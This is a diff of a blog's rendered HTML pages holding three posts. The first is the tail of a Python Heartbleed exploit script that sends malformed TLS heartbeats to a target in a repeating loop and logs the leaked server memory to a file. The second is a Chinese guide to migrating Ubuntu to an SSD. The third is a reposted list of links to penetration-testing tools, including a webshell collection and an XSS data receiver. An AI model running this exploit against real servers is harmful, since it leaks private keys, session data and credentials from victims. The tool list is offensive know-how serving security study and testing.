18 00 09  00 0a 00 16 00 17 00 08</span></span><br><span class="line"><span class="string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span></span><br><span class="line"><span class="string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span></span><br><span class="line"><span class="string">00 0f 00 01 01</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> hello</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_hb</span>(<span class="params">version</span>):</span></span><br><span class="line">	hb = h2bin(<span class="string">&#x27;18 &#x27;</span> + version + <span class="string">&#x27; 00 03 01 ff ff&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> hb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span>(<span class="params">s</span>):</span>         <span class="comment">#########ascii characters ##########</span></span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    times = time.strftime(<span class="string">&#x27;%Y.%m.%d.%H.%M.%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    pdat = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</span><br><span class="line">        pdat += <span class="string">&#x27;&#x27;</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;%s&#x27;</span> % (pdat.replace(<span class="string">&#x27;......&#x27;</span>, <span class="string">&#x27;&#x27;</span>),)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;----------------------------&#x27;</span>+times+<span class="string">&#x27;----------------------------------&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(opts.dest,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;%s&#x27;</span> % (pdat.replace(<span class="string">&#x27;......&#x27;</span>, <span class="string">&#x27;&#x27;</span>),))</span><br><span class="line">        f.write(<span class="string">&#x27;\n----------------------------&#x27;</span>+times+<span class="string">&#x27;----------------------------------\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span>(<span class="params">s, length, timeout=<span class="number">5</span></span>):</span></span><br><span class="line">	endtime = time.time() + timeout</span><br><span class="line">	rdata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	remain = length</span><br><span class="line">	<span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">		rtime = endtime - time.time()</span><br><span class="line">		<span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">		r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">		<span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">			data = s.recv(remain)</span><br><span class="line">			<span class="comment"># EOF?</span></span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">			rdata += data</span><br><span class="line">			remain -= <span class="built_in">len</span>(data)</span><br><span class="line">	<span class="keyword">return</span> rdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span>(<span class="params">s</span>):</span></span><br><span class="line">	hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">	<span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Unexpected EOF receiving record header - server closed connection&#x27;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">	typ, ver, ln = struct.unpack(<span class="string">&#x27;&gt;BHH&#x27;</span>, hdr)</span><br><span class="line">	pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> pay <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Unexpected EOF receiving record payload - server closed connection&#x27;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27; ... received message: type = %d, ver = %04x, length = %d&#x27;</span> % (typ, ver, <span class="built_in">len</span>(pay))</span><br><span class="line">	<span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span>(<span class="params">s,hb</span>):</span></span><br><span class="line">	s.send(hb)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		typ, ver, pay = recvmsg(s)</span><br><span class="line">		<span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;No heartbeat response received, server likely not vulnerable&#x27;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> typ == <span class="number">24</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Received heartbeat response:&#x27;</span></span><br><span class="line">			hexdump(pay)</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(pay) &gt; <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Received alert:&#x27;</span></span><br><span class="line">			hexdump(pay)</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Server returned error, likely not vulnerable&#x27;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delay</span>(<span class="params"><span class="built_in">int</span></span>):</span></span><br><span class="line">    time.sleep(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	opts, args = options.parse_args()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">1</span>:</span><br><span class="line">		options.print_help()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	times = time.strftime(<span class="string">&#x27;%Y.%m.%d.%H.%M.%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#test</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(version)):</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Trying &#x27;</span> + version[i][<span class="number">0</span>] + <span class="string">&#x27;...&#x27;</span></span><br><span class="line">			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Connecting...&#x27;</span></span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			s.connect((args[<span class="number">0</span>], opts.port))</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Sending Client Hello...&#x27;</span></span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			s.send(create_hello(version[i][<span class="number">1</span>]))</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Waiting for Server Hello...&#x27;</span></span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">				typ, ver, pay = recvmsg(s)</span><br><span class="line">				<span class="keyword">if</span> typ == <span class="literal">None</span>:</span><br><span class="line">					<span class="built_in">print</span> <span class="string">&#x27;Server closed connection without sending Server Hello.&#x27;</span></span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				<span class="comment"># Look for server hello done message.</span></span><br><span class="line">				<span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> <span class="built_in">ord</span>(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Sending heartbeat request...&#x27;</span></span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			s.send(create_hb(version[i][<span class="number">1</span>]))</span><br><span class="line">			<span class="keyword">if</span> hit_hb(s,create_hb(version[i][<span class="number">1</span>])):</span><br><span class="line">				<span class="comment">#Stop if vulnerable</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		delay(opts.time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -220,7 +370,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -241,6 +391,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -248,7 +399,33 @@
   <time datetime="2017-11-25T06:02:00.000Z" itemprop="datePublished">2017-11-25</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近日，一名小伙伴给我安利了一波deepin大法，但无奈我微星的本子装ubuntu都麻烦，因此强行安装一波后用户体验极差，思来想去还是ubuntu靠谱。但无奈很早之前我把ubuntu装在了机械硬盘上，现在又想把系统原封不动的迁移到固态上因此就有了此文。仅做记录，有错误的地方请大佬斧正，若有更便捷的方法还请告知。</p>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>操作系统：Ubuntu 16.04 LTS<br>使用软件：Systemback   、    Grub Customizer<br>U盘一个</p>
+<h2 id="Systemback"><a href="#Systemback" class="headerlink" title="Systemback"></a>Systemback</h2><p>Systemback是一个Ubuntu系统中用于发布自定义系统镜像和系统备份的软件。有时候我们对自己的Ubuntu做了很多设置，比如各种软件包，各种自定义的配置。我们想要在另一台电脑上也安装一个和我们一模一样的系统，这个时候就会用到这种方法了。这个方法不仅可以用于发布系统，也可以用来作为系统备份使用。</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:nemh/systemback</span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install systemback unionfs-fuse</span><br></pre></td></tr></table></figure>
+
+<h2 id="Grub-Customizer"><a href="#Grub-Customizer" class="headerlink" title="Grub Customizer"></a>Grub Customizer</h2><p>Grub Customizer ，是一个很酷的GRUB2 配置工，图形化界面，让你配置更简单，轻松上手。</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:danielrichter2007/grub-customizer</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install grub-customizer</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h1><p>安装好systemback后在Dash菜单中找到并打开</p>
+<p><img src="http://photo.o0o0.club/25/1511587358728.jpg" alt="enter description here"><br>根据提示输入管理密码进入主界面</p>
+<p><img src="http://photo.o0o0.club/25/1511587416780.jpg" alt="enter description here"><br>在【还原点操作】处点击【创建新的】创建好我们的第一个还原点，也以便以后做系统测试时莫名其妙的系统崩溃了用做还原。</p>
+<h2 id="创建live"><a href="#创建live" class="headerlink" title="创建live"></a>创建live</h2><p>终于……创建好了还原点后我们在【功能菜单】处点击【创建live系统】</p>
+<p><img src="http://photo.o0o0.club/25/1511587476066.jpg" alt="enter description here"><br>记得勾上【包含用户数据文件】然后点击【创建新的】创建完成后我们插入U盘将创建好的live镜像写入Upan。在【创建支持live模式的镜像】处选择我们刚刚创建好的镜像后找到【live模式选项】中的【向目标设备写入】然后等待写入完成</p>
+<h2 id="写入SSD"><a href="#写入SSD" class="headerlink" title="写入SSD"></a>写入SSD</h2><p>当完成写入后，重启电脑进入BIOS将第一启动项设置成U盘进入系统，打开systemback<br>file:///media/guoker/%E5%BC%80%E5%8F%91/U%E7%9B%98%E4%B8%AD%E7%9A%84systembak.png<img src="http://photo.o0o0.club/25/1511588194407.jpg" alt="enter description here"><br>点击【功能菜单】处的【系统安装】<br><img src="http://photo.o0o0.club/25/1511588259360.jpg" alt="enter description here"><br>设置好账号密码等相关信息后点击下一步<br><img src="http://photo.o0o0.club/25/1511588305417.jpg" alt="enter description here"><br>选择好分区并勾上【传递用户配置文件及用户数据】（不推荐在ssd上挂载swap）选择完成后点击【绿色的左箭头】点击下一步等待写入完成即可</p>
+<h2 id="引导启动"><a href="#引导启动" class="headerlink" title="引导启动"></a>引导启动</h2><p>写入完成后我们需要修改grub2来完成引导新的ubuntu启动（貌似我这儿系统完成写入后不会自动修改引导进入存放在ssd上的ubuntu而是默认进入装在机械硬盘上的系统）<br>由于我对grub并不熟悉，所以我选择使用Grub Customizer来完成修改。<br>在Dash菜单中找到Grub Customizer输入管理员密码后启动<br><img src="http://photo.o0o0.club/25/1511588696928.jpg" alt="enter description here"><br>由于我现在已经修改好了，所以我的截图会与实际不符，大家操作的时候只要选中第一项右键编辑即可查看引导的信息<br><img src="http://photo.o0o0.club/25/1511588892484.jpg" alt="enter description here"><br>选中并复制，然后我们新建一条<br><img src="http://photo.o0o0.club/25/1511588975737.jpg" alt="enter description here"><br>把我们复制下来的内容黏贴进去，并做修改（两个修改事项分区位置和uuid），首先我们之前安装的位置是在第一硬盘的第三分区（hd0,gpt3）然后再查看我们的硬盘uuid以及安装的系统所在的分区。</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid    <span class="comment">#查询硬盘UUID</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://photo.o0o0.club/25/1511589259055.jpg" alt="enter description here"><br>uuid=67990180-344a-45ad-b765-fb9dfe56978f<br>完成替换后我们保存新建的条项目，在【常规设置】中【默认项】里的【预定义】设置成我们先建的条项目，点击保存即可。</p>
+<h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>重启后即可进入安装在ssd上的系统</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -261,7 +438,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -282,6 +459,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -289,7 +467,192 @@
   <time datetime="2017-11-02T13:11:00.000Z" itemprop="datePublished">2017-11-02</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <p>原文地址：<br><a target="_blank" rel="noopener" href="https://www.t00ls.net/pytools.html">https://www.t00ls.net/pytools.html</a></p>
+<p>感谢backlion整理</p>
+<h1 id="漏洞及渗透练习平台："><a href="#漏洞及渗透练习平台：" class="headerlink" title="漏洞及渗透练习平台："></a>漏洞及渗透练习平台：</h1><h2 id="WebGoat漏洞练习平台："><a href="#WebGoat漏洞练习平台：" class="headerlink" title="WebGoat漏洞练习平台："></a>WebGoat漏洞练习平台：</h2><p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
+<h2 id="webgoat-legacy漏洞练习平台"><a href="#webgoat-legacy漏洞练习平台" class="headerlink" title="webgoat-legacy漏洞练习平台:"></a>webgoat-legacy漏洞练习平台:</h2><p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+<h2 id="zvuldirll漏洞练习平台："><a href="#zvuldirll漏洞练习平台：" class="headerlink" title="zvuldirll漏洞练习平台："></a>zvuldirll漏洞练习平台：</h2><p><a target="_blank" rel="noopener" href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a></p>
+<h2 id="vulapps漏洞练习平台："><a href="#vulapps漏洞练习平台：" class="headerlink" title="vulapps漏洞练习平台："></a>vulapps漏洞练习平台：</h2><p><a target="_blank" rel="noopener" href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a></p>
+<h2 id="dvwa漏洞练习平台："><a href="#dvwa漏洞练习平台：" class="headerlink" title="dvwa漏洞练习平台："></a>dvwa漏洞练习平台：</h2><p><a target="_blank" rel="noopener" href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a></p>
+<h2 id="数据库注入练习平台-："><a href="#数据库注入练习平台-：" class="headerlink" title="数据库注入练习平台 ："></a>数据库注入练习平台 ：</h2><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<h2 id="用node编写的漏洞练习平台，like-OWASP-Node-Goat："><a href="#用node编写的漏洞练习平台，like-OWASP-Node-Goat：" class="headerlink" title="用node编写的漏洞练习平台，like OWASP Node Goat："></a>用node编写的漏洞练习平台，like OWASP Node Goat：</h2><p><a target="_blank" rel="noopener" href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a></p>
+<h2 id="Ruby编写的一款工具，生成含漏洞的虚拟机："><a href="#Ruby编写的一款工具，生成含漏洞的虚拟机：" class="headerlink" title="Ruby编写的一款工具，生成含漏洞的虚拟机："></a>Ruby编写的一款工具，生成含漏洞的虚拟机：</h2><p><a target="_blank" rel="noopener" href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p>
+<h1 id="花式扫描器-："><a href="#花式扫描器-：" class="headerlink" title="花式扫描器 ："></a>花式扫描器 ：</h1><h2 id="Nmap端口扫描器："><a href="#Nmap端口扫描器：" class="headerlink" title="Nmap端口扫描器："></a>Nmap端口扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
+<h2 id="本地网络扫描器："><a href="#本地网络扫描器：" class="headerlink" title="本地网络扫描器："></a>本地网络扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a></p>
+<h2 id="子域名扫描器："><a href="#子域名扫描器：" class="headerlink" title="子域名扫描器："></a>子域名扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a></p>
+<h2 id="linux漏洞扫描："><a href="#linux漏洞扫描：" class="headerlink" title="linux漏洞扫描："></a>linux漏洞扫描：</h2><p><a target="_blank" rel="noopener" href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a></p>
+<h2 id="基于端口扫描以及关联CVE"><a href="#基于端口扫描以及关联CVE" class="headerlink" title="基于端口扫描以及关联CVE:"></a>基于端口扫描以及关联CVE:</h2><p><a target="_blank" rel="noopener" href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a></p>
+<h2 id="漏洞路由扫描器："><a href="#漏洞路由扫描器：" class="headerlink" title="漏洞路由扫描器："></a>漏洞路由扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a></p>
+<h2 id="迷你批量信息泄漏扫描脚本："><a href="#迷你批量信息泄漏扫描脚本：" class="headerlink" title="迷你批量信息泄漏扫描脚本："></a>迷你批量信息泄漏扫描脚本：</h2><p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p>
+<h2 id="Waf类型检测工具："><a href="#Waf类型检测工具：" class="headerlink" title="Waf类型检测工具："></a>Waf类型检测工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
+<h2 id="服务器端口弱口令扫描器："><a href="#服务器端口弱口令扫描器：" class="headerlink" title="服务器端口弱口令扫描器："></a>服务器端口弱口令扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a></p>
+<h2 id="Fox-scan扫描器："><a href="#Fox-scan扫描器：" class="headerlink" title="Fox-scan扫描器："></a>Fox-scan扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
+<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具 :"></a>信息搜集工具 :</h1><h2 id="社工收集器："><a href="#社工收集器：" class="headerlink" title="社工收集器："></a>社工收集器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a></p>
+<h2 id="Github信息搜集："><a href="#Github信息搜集：" class="headerlink" title="Github信息搜集："></a>Github信息搜集：</h2><p><a target="_blank" rel="noopener" href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a></p>
+<h2 id="github-Repo信息搜集工具："><a href="#github-Repo信息搜集工具：" class="headerlink" title="github Repo信息搜集工具："></a>github Repo信息搜集工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
+<h2 id="信息探测及扫描工具："><a href="#信息探测及扫描工具：" class="headerlink" title="信息探测及扫描工具："></a>信息探测及扫描工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a></p>
+<h2 id="内部网络信息扫描器："><a href="#内部网络信息扫描器：" class="headerlink" title="内部网络信息扫描器："></a>内部网络信息扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a></p>
+<h2 id="远程桌面登录扫描器："><a href="#远程桌面登录扫描器：" class="headerlink" title="远程桌面登录扫描器："></a>远程桌面登录扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a></p>
+<h2 id="网络基础设施渗透工具"><a href="#网络基础设施渗透工具" class="headerlink" title="网络基础设施渗透工具"></a>网络基础设施渗透工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a></p>
+<h2 id="SNMAP密码破解"><a href="#SNMAP密码破解" class="headerlink" title="SNMAP密码破解:"></a>SNMAP密码破解:</h2><p><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
+<h1 id="WEB："><a href="#WEB：" class="headerlink" title="WEB："></a>WEB：</h1><h2 id="webshell大合集："><a href="#webshell大合集：" class="headerlink" title="webshell大合集："></a>webshell大合集：</h2><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+<h2 id="渗透以及web攻击脚本："><a href="#渗透以及web攻击脚本：" class="headerlink" title="渗透以及web攻击脚本："></a>渗透以及web攻击脚本：</h2><p><a target="_blank" rel="noopener" href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a></p>
+<h2 id="web渗透小工具大合集："><a href="#web渗透小工具大合集：" class="headerlink" title="web渗透小工具大合集："></a>web渗透小工具大合集：</h2><p><a target="_blank" rel="noopener" href="https://github.com/rootphantomer/hacktoolsfor_me">https://github.com/rootphantomer/hacktoolsfor_me</a></p>
+<h2 id="XSS数据接收平台："><a href="#XSS数据接收平台：" class="headerlink" title="XSS数据接收平台："></a>XSS数据接收平台：</h2><p><a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<h2 id="XSS与CSRF工具："><a href="#XSS与CSRF工具：" class="headerlink" title="XSS与CSRF工具："></a>XSS与CSRF工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a></p>
+<h2 id="xss多功能扫描器："><a href="#xss多功能扫描器：" class="headerlink" title="xss多功能扫描器："></a>xss多功能扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p>
+<h2 id="web漏洞扫描器"><a href="#web漏洞扫描器" class="headerlink" title="web漏洞扫描器:"></a>web漏洞扫描器:</h2><p><a target="_blank" rel="noopener" href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a></p>
+<h2 id="WEB漏洞扫描器："><a href="#WEB漏洞扫描器：" class="headerlink" title="WEB漏洞扫描器："></a>WEB漏洞扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p>
+<h2 id="渗透常用小工具包："><a href="#渗透常用小工具包：" class="headerlink" title="渗透常用小工具包："></a>渗透常用小工具包：</h2><p><a target="_blank" rel="noopener" href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a></p>
+<h1 id="web目录扫描器"><a href="#web目录扫描器" class="headerlink" title="web目录扫描器:"></a>web目录扫描器:</h1><p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
+<h2 id="web向命令注入检测工具："><a href="#web向命令注入检测工具：" class="headerlink" title="web向命令注入检测工具："></a>web向命令注入检测工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a></p>
+<h2 id="自动化SQL注入检查工具："><a href="#自动化SQL注入检查工具：" class="headerlink" title="自动化SQL注入检查工具："></a>自动化SQL注入检查工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
+<h2 id="SSL扫描器："><a href="#SSL扫描器：" class="headerlink" title="SSL扫描器："></a>SSL扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>
+<h2 id="安全工具集合："><a href="#安全工具集合：" class="headerlink" title="安全工具集合："></a>安全工具集合：</h2><p><a target="_blank" rel="noopener" href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a></p>
+<h2 id="apache日志分析器："><a href="#apache日志分析器：" class="headerlink" title="apache日志分析器："></a>apache日志分析器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a></p>
+<h2 id="php代码审计工具："><a href="#php代码审计工具：" class="headerlink" title="php代码审计工具："></a>php代码审计工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a></p>
+<h2 id="web指纹识别扫描："><a href="#web指纹识别扫描：" class="headerlink" title="web指纹识别扫描："></a>web指纹识别扫描：</h2><p><a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a></p>
+<h2 id="检查网站恶意攻击："><a href="#检查网站恶意攻击：" class="headerlink" title="检查网站恶意攻击："></a>检查网站恶意攻击：</h2><p><a target="_blank" rel="noopener" href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a></p>
+<h2 id="wordprees漏洞扫描器："><a href="#wordprees漏洞扫描器：" class="headerlink" title="wordprees漏洞扫描器："></a>wordprees漏洞扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p>
+<h2 id="固件漏洞扫描器："><a href="#固件漏洞扫描器：" class="headerlink" title="固件漏洞扫描器："></a>固件漏洞扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/misterch0c/firminator_backend">https://github.com/misterch0c/firminator_backend</a></p>
+<h2 id="数据库注入工具"><a href="#数据库注入工具" class="headerlink" title="数据库注入工具"></a>数据库注入工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<h2 id="Web代理："><a href="#Web代理：" class="headerlink" title="Web代理："></a>Web代理：</h2><p><a target="_blank" rel="noopener" href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a></p>
